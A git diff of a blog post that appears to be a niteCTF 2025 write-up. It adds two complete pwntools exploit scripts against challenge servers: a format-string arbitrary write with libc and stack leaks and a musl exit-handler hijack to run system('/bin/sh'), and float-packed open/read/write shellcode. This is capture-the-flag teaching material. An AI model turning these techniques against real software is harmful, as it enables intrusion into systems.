@@ -7,8 +7,8 @@ authors: ['aker']
 draft: false
 ---
 >[niteCTF 2025](https://ctftime.org/event/2851) is a two-day online and jeopardy style competition hosted by [Cryptonite](https://ctftime.org/team/62713).
-I was able to solve 2 tasks in the PWN, one of them I have managed to blood :)
 
+I was able to solve 2 tasks in the PWN, one of them I have managed to blood :)
 ![](https://raw.githubusercontent.com/Akerdidik/Akerdidik.github.io/refs/heads/main/src/content/blog/nite-ctf-2025-writeups/blood_pwn.png)
 
 I was participating with my team - [FR13NDS TEAM](https://ctftime.org/team/155678) and we took 7-th place at this event, also totally managed to take 4 bloods!
@@ -38,7 +38,87 @@ I was participating with my team - [FR13NDS TEAM](https://ctftime.org/team/15567
 
 ### Full Exploit Script
 
+```python
+from pwn import *
+
+def prepare_64(target, data):
+        res = []
+        for i, b in enumerate(data):
+                writes = {target + i : b}
+                res.append(writes)
+        return res
+
+def arb_write(p, offset, target, data, rel):
+        res = prepare_64(target, p64(data))[:rel]
+        for i in res:
+                payload = fmtstr_payload(offset, i, no_dollars = True)
+                action(p, 0, payload)
+
+def make_char(p, index, cls, name):
+        p.sendlineafter(b'>>', b'1')
+        p.sendlineafter(b'index:', str(index).encode())
+        p.sendlineafter(b'>>', str(cls).encode())
+        p.sendafter(b'>>', name)
+
+def action(p, index, msg = None):
+        p.sendlineafter(b'>>', b'2')
+        p.sendlineafter(b'index:', str(index).encode())
+        if msg:
+                p.send(msg)
+
+exe = ELF('./chall')
+libc = ELF('./libc.so')
+context.binary = exe
+context.terminal = ["tmux", "splitw", "-h"]
+
+p = remote('yellow.chals.nitectf25.live', 1337, ssl = True)
+# p = gdb.debug([exe.path], '''continue''')
+
+make_char(p, 0, 1, b'A' * 32)
+
+action(p, 0, b'%p.' * 10)
+p.recvuntil(b'adventurers')
+p.recvline()
+
+leaks = p.recvline().split(b'.')
+libc_leak = int(leaks[5].decode(), 16)
+libc.address = libc_leak - (0x70bb83e87280 - 0x70bb83dc9000)
+print(f"Libc leak: {hex(libc_leak)}")
+print(f"Libc address: {hex(libc.address)}")
+
+target = exe.sym.list + 16
+offset = 8
+
+arb_write(p, offset, target + 8, u64(b'/bin/sh\x00'), -1)
+arb_write(p, offset, target - 8, libc.sym.environ, -2)
+
+p.sendlineafter(b'>>', b'2')
+p.sendlineafter(b'index:', b'1')
+p.recvuntil(b'chose ')
+
+stack_leak = u64(p.recv(6).ljust(8, b'\x00'))
+print(f"Stack: {hex(stack_leak)}")
+
+p.sendafter(b'leave', b'a')
+
+struct_fl = libc.address + 789896
+fake_fl = stack_leak + 640
+
+arb_write(p, offset, struct_fl, fake_fl, -2)
+arb_write(p, offset, fake_fl, fake_fl, -2)
+arb_write(p, offset, fake_fl + 0x100, libc.sym.system, -2)
+arb_write(p, offset, fake_fl + 0x200, target + 8, -5)
+
+p.sendlineafter(b'>>', b'3')
+p.sendline(b'cat flag.txt')
+
+p.interactive()
+```
+
 ## Key Takeaways
+
+- Limited printf is still useful
+- Musl has pretty fun way to achieve rce via exit handlers :)
 
 ## References
 
@@ -57,7 +137,69 @@ I was participating with my team - [FR13NDS TEAM](https://ctftime.org/team/15567
 
 ### Full Exploit Script
 
+```python
+from pwn import *
+import struct
+
+exe = ELF('./chall_dancer')
+context.binary = exe
+context.terminal = ["tmux", "splitw", "-h"]
+
+shellcode = asm('''
+    /* open("./flag", 0, 0) */
+    lea rdi, [rip + flag_str]
+    xor esi, esi
+    xor edx, edx
+    mov rax, 2
+    syscall
+
+    /* read(fd, rsp, 100) */
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 100
+    xor rax, rax
+    syscall
+
+    /* write(1, rsp, rax) */
+    mov rdx, rax
+    mov rdi, 1
+    mov rsi, rsp
+    mov rax, 1
+    mov rdx, 100
+    syscall
+
+    mov rdi, 0
+    mov rax, 0xe7 # exit_group
+    syscall
+
+flag_str:
+    .asciz "./flag"
+''')
+
+while len(shellcode) % 8 != 0:
+    shellcode += b"\x90"
+
+floats = []
+for i in range(0, len(shellcode), 8):
+    chunk = shellcode[i:i+8]
+    float_val = struct. unpack('<d', chunk)[0]
+    floats.append(float_val)
+
+# p = gdb.debug([exe.path], '''continue''')
+p = remote('dancer.chals.nitectf25.live', 1337, ssl = True)
+
+p.sendlineafter(b'!', str(len(floats)).encode())
+
+for f in floats:
+        p.sendline(repr(f).encode())
+
+p.interactive()
+```
+
 ## Key Takeaways
+
+- Float packing to write payload
+- Classic open read write shellcode
 
 ## References
 
